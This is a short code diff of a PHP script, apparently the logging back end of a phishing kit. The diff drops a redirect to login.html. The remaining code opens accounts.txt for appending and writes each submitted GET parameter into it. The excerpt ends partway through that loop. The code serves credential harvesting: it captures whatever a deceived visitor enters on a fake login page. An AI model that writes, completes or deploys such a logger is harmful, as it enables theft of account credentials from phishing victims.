@@ -1,5 +1,4 @@
 <?php
-header ('Location:login.html');
 $handle = fopen("accounts.txt", "a");
 foreach($_GET as $variable => $value) {
    fwrite($handle, $variable);
